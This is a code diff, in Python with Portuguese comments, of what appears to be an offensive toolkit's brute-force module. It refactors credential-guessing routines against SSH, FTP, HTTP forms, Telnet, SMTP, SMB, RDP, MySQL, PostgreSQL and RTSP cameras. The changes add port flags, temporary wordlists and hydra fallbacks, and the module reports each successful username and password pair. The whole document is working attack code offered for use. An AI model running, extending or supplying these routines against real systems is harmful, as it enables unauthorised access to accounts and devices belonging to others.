@@ -24,11 +24,40 @@ except Exception:
     paramiko = None
 
 
-def _listas(ctx):
-    """Carrega wordlists de usuários e senhas (CLI ou config)."""
+def _extras(ctx):
+    """Posicionais e flags vindos da CLI (parse central em core.utils)."""
+    return utils.parse_extras(ctx.get("extras"))
+
+
+def _porta(ctx, padrao):
+    """Retorna (porta, n_posicionais_consumidos_pela_porta).
+
+    `--port 2222` e a forma recomendada; um primeiro posicional todo
+    numerico tambem vale (compatibilidade) e e consumido aqui, para que
+    as wordlists NUNCA sejam confundidas com a porta.
+    """
+    pos, flags = _extras(ctx)
+    if "port" in flags:
+        try:
+            return int(flags["port"]), 0
+        except ValueError:
+            pass
+    if pos and pos[0].isdigit():
+        return int(pos[0]), 1
+    return padrao, 0
+
+
+def _listas(ctx, consumir=0):
+    """Carrega wordlists de usuários e senhas (flags > posicionais > config)."""
     cfg = ctx["config"]
-    w_users = ctx["extras"][0] if ctx["extras"] else cfg.get("wordlist_users", "wordlists/users.txt")
-    w_pwds = ctx["extras"][1] if len(ctx["extras"]) > 1 else cfg.get("wordlist_passwords", "wordlists/passwords.txt")
+    pos, flags = _extras(ctx)
+    resto = pos[consumir:] if consumir else list(pos)
+    w_users = (flags.get("users") or flags.get("wordlist-users")
+               or (resto[0] if resto else None)
+               or cfg.get("wordlist_users", "wordlists/users.txt"))
+    w_pwds = (flags.get("pass") or flags.get("wordlist-pass")
+              or (resto[1] if len(resto) > 1 else None)
+              or cfg.get("wordlist_passwords", "wordlists/passwords.txt"))
     users = utils.ler_lista(w_users)
     pwds = utils.ler_lista(w_pwds)
     if not users:
@@ -38,9 +67,9 @@ def _listas(ctx):
     return users, pwds
 
 
-def _loop(modulo, alvo, ctx, tentar):
+def _loop(modulo, alvo, ctx, tentar, consumir=0):
     """Motor genérico de tentativas com delay, dry-run e log."""
-    users, pwds = _listas(ctx)
+    users, pwds = _listas(ctx, consumir)
     total = len(users) * len(pwds)
     if utils.is_dry(ctx):
         utils.mostrar_dry(modulo, "{} combinacoes contra {}".format(total, alvo))
@@ -57,7 +86,7 @@ def _loop(modulo, alvo, ctx, tentar):
                 ok = False
             if ok:
                 print(utils.c("  [+] SUCESSO: {}:{}".format(u, p), utils.VERDE))
-                utils.log(modulo, alvo, "sucesso {}:{}".format(u, p))
+                utils.log(modulo, alvo, "sucesso {}:{}".format(u, utils.mascarar(p)))
                 return (u, p)
             print("    [{}/n] {}:{}".format(n, u, p))
             time.sleep(atraso)
@@ -66,41 +95,58 @@ def _loop(modulo, alvo, ctx, tentar):
     return None
 
 
-def _hydra(alvo, servico, porta, modulo):
+def _hydra(alvo, servico, porta, modulo, ctx=None, consumir=0):
     """Fallback hydra quando a lib Python nativa nao existe."""
-    cfg_ctx = {"extras": [], "config": utils.carregar_config()}
+    if ctx is None:
+        ctx = {"extras": [], "config": utils.carregar_config()}
+    if utils.is_dry(ctx):
+        users, pwds = _listas(ctx, consumir)
+        utils.mostrar_dry(modulo, "{} combinacoes via hydra ({}://{}:{})".format(
+            len(users) * len(pwds), servico, alvo, porta))
+        return
     if not utils.exigir_ferramenta("hydra"):
         return
-    users, pwds = _listas(cfg_ctx)
-    # Gera wordlists temporarios para o hydra
-    import os
-    tmp_u = os.path.join(utils.caminho("logs"), "_hydra_users.txt")
-    tmp_p = os.path.join(utils.caminho("logs"), "_hydra_pass.txt")
-    with open(tmp_u, "w") as f:
-        f.write("\n".join(users))
-    with open(tmp_p, "w") as f:
-        f.write("\n".join(pwds))
-    cmd = ["hydra", "-L", tmp_u, "-P", tmp_p, "-s", str(porta), "-V", "-f", "{}://{}".format(servico, alvo)]
-    print("  Executando: " + " ".join(cmd))
-    import subprocess
+    users, pwds = _listas(ctx, consumir)
+    # Wordlists temporarios fora do repositorio (nunca no ./logs)
+    import tempfile
+    arq_u = arq_p = None
     try:
-        out = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
-        print((out.stdout or "") + (out.stderr or ""))
-        utils.log(modulo, alvo, "hydra concluido")
-    except Exception as e:
-        print(utils.c("  Erro hydra: {}".format(e), utils.VERMELHO))
+        with tempfile.NamedTemporaryFile("w", suffix="_u.txt", delete=False) as f:
+            f.write("\n".join(users))
+            arq_u = f.name
+        with tempfile.NamedTemporaryFile("w", suffix="_p.txt", delete=False) as f:
+            f.write("\n".join(pwds))
+            arq_p = f.name
+        cmd = ["hydra", "-L", arq_u, "-P", arq_p, "-s", str(porta), "-V", "-f",
+               "{}://{}".format(servico, alvo)]
+        print("  Executando: " + " ".join(cmd))
+        import subprocess
+        try:
+            out = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
+            print((out.stdout or "") + (out.stderr or ""))
+            utils.log(modulo, alvo, "hydra concluido")
+        except Exception as e:
+            print(utils.c("  Erro hydra: {}".format(e), utils.VERMELHO))
+    finally:
+        import os as _os
+        for arq in (arq_u, arq_p):
+            if arq:
+                try:
+                    _os.unlink(arq)
+                except Exception:
+                    pass
 
 
 def ssh(alvo, ctx):
     """SSH Brute Force (paramiko, hydra como fallback)."""
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else 22
+    porta, consumir = _porta(ctx, 22)
     if utils.is_dry(ctx):
-        users, pwds = _listas(ctx)
+        users, pwds = _listas(ctx, consumir)
         utils.mostrar_dry("ssh", "{}:{} com {} combinacoes".format(alvo, porta, len(users) * len(pwds)))
         return
     if paramiko is None:
         print(utils.c("  paramiko ausente — usando hydra.", utils.AMARELO))
-        _hydra(alvo, "ssh", porta, "ssh")
+        _hydra(alvo, "ssh", porta, "ssh", ctx, consumir)
         return
 
     def tentar(u, p):
@@ -114,12 +160,12 @@ def ssh(alvo, ctx):
         except Exception:
             return False
 
-    _loop("ssh", alvo, ctx, tentar)
+    _loop("ssh", alvo, ctx, tentar, consumir)
 
 
 def ftp(alvo, ctx):
     """FTP Brute Force (ftplib)."""
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else 21
+    porta, consumir = _porta(ctx, 21)
 
     def tentar(u, p):
         f = ftplib.FTP()
@@ -135,7 +181,7 @@ def ftp(alvo, ctx):
                 pass
             return False
 
-    _loop("ftp", alvo, ctx, tentar)
+    _loop("ftp", alvo, ctx, tentar, consumir)
 
 
 def http_basic(alvo, ctx):
@@ -157,9 +203,17 @@ def http_basic(alvo, ctx):
 
 
 def http_form(alvo, ctx):
-    """HTTP Form Login Brute Force (POST)."""
+    """HTTP Form Login Brute Force (POST).
+
+    Posicionais = nome dos campos (usuario, senha). Wordlists vem de
+    --users/--pass ou do config.json.
+    """
+    pos, flags = _extras(ctx)
+    consumir = min(len(pos), 2)
+    campo_u = flags.get("user-field") or (pos[0] if len(pos) > 0 else None)
+    campo_p = flags.get("pass-field") or (pos[1] if len(pos) > 1 else None)
     if utils.is_dry(ctx):
-        users, pwds = _listas(ctx)
+        users, pwds = _listas(ctx, consumir)
         utils.mostrar_dry("http_form", "{} combinacoes contra {}".format(len(users) * len(pwds), alvo))
         return
     if requests is None:
@@ -168,10 +222,9 @@ def http_form(alvo, ctx):
         else:
             print(utils.c("  Modulo 'requests' indisponivel — http_form cancelado.", utils.VERMELHO))
             return
-    if len(ctx["extras"]) >= 3:
-        campo_u, campo_p = ctx["extras"][0], ctx["extras"][1]
-    else:
+    if campo_u is None:
         campo_u = utils.perguntar("Campo do usuario", "username")
+    if campo_p is None:
         campo_p = utils.perguntar("Campo da senha", "password")
 
     # Baseline com credencial invalida para comparar tamanhos de resposta
@@ -195,12 +248,12 @@ def http_form(alvo, ctx):
             return True
         return False
 
-    _loop("http_form", alvo, ctx, tentar)
+    _loop("http_form", alvo, ctx, tentar, consumir)
 
 
 def telnet(alvo, ctx):
     """Telnet Brute Force (socket puro, sem telnetlib)."""
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else 23
+    porta, consumir = _porta(ctx, 23)
 
     def tentar(u, p):
         s = socket.socket()
@@ -228,12 +281,12 @@ def telnet(alvo, ctx):
             except Exception:
                 pass
 
-    _loop("telnet", alvo, ctx, tentar)
+    _loop("telnet", alvo, ctx, tentar, consumir)
 
 
 def smtp(alvo, ctx):
     """SMTP Brute Force (AUTH LOGIN)."""
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else 587
+    porta, consumir = _porta(ctx, 587)
     use_tls = porta == 465
 
     def tentar(u, p):
@@ -258,48 +311,52 @@ def smtp(alvo, ctx):
                     pass
             return False
 
-    _loop("smtp", alvo, ctx, tentar)
+    _loop("smtp", alvo, ctx, tentar, consumir)
 
 
 def smb(alvo, ctx):
     """SMB Brute Force (hydra — limitado)."""
-    _hydra(alvo, "smb", 445, "smb")
+    porta, consumir = _porta(ctx, 445)
+    _hydra(alvo, "smb", porta, "smb", ctx, consumir)
 
 
 def rdp(alvo, ctx):
     """RDP Brute Force (hydra — limitado, sem GUI)."""
-    _hydra(alvo, "rdp", 3389, "rdp")
+    porta, consumir = _porta(ctx, 3389)
+    _hydra(alvo, "rdp", porta, "rdp", ctx, consumir)
 
 
 def mysql(alvo, ctx):
-    """MySQL Brute Force (hydra — pymysql é opcional)."""
+    """MySQL Brute Force (pymysql, hydra como fallback)."""
+    porta, consumir = _porta(ctx, 3306)
     try:
         import pymysql  # noqa
         def tentar(u, p):
-            c = pymysql.connect(host=alvo, user=u, password=p, connect_timeout=8)
+            c = pymysql.connect(host=alvo, port=porta, user=u, password=p, connect_timeout=8)
             c.close()
             return True
-        _loop("mysql", alvo, ctx, tentar)
+        _loop("mysql", alvo, ctx, tentar, consumir)
     except ImportError:
-        _hydra(alvo, "mysql", 3306, "mysql")
+        _hydra(alvo, "mysql", porta, "mysql", ctx, consumir)
 
 
 def postgres(alvo, ctx):
-    """PostgreSQL Brute Force (hydra — psycopg2 é opcional)."""
+    """PostgreSQL Brute Force (psycopg2, hydra como fallback)."""
+    porta, consumir = _porta(ctx, 5432)
     try:
         import psycopg2  # noqa
         def tentar(u, p):
-            c = psycopg2.connect(host=alvo, user=u, password=p, connect_timeout=8)
+            c = psycopg2.connect(host=alvo, port=porta, user=u, password=p, connect_timeout=8)
             c.close()
             return True
-        _loop("postgres", alvo, ctx, tentar)
+        _loop("postgres", alvo, ctx, tentar, consumir)
     except ImportError:
-        _hydra(alvo, "postgres", 5432, "postgres")
+        _hydra(alvo, "postgres", porta, "postgres", ctx, consumir)
 
 
 def rtsp(alvo, ctx):
     """RTSP Brute Force (câmeras IP) via DESCRIBE com Basic/Digest."""
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else 554
+    porta, consumir = _porta(ctx, 554)
 
     def tentar(u, p):
         s = socket.socket()
@@ -337,7 +394,7 @@ def rtsp(alvo, ctx):
             except Exception:
                 pass
 
-    _loop("rtsp", alvo, ctx, tentar)
+    _loop("rtsp", alvo, ctx, tentar, consumir)
 
 
 def admin_panel(alvo, ctx):
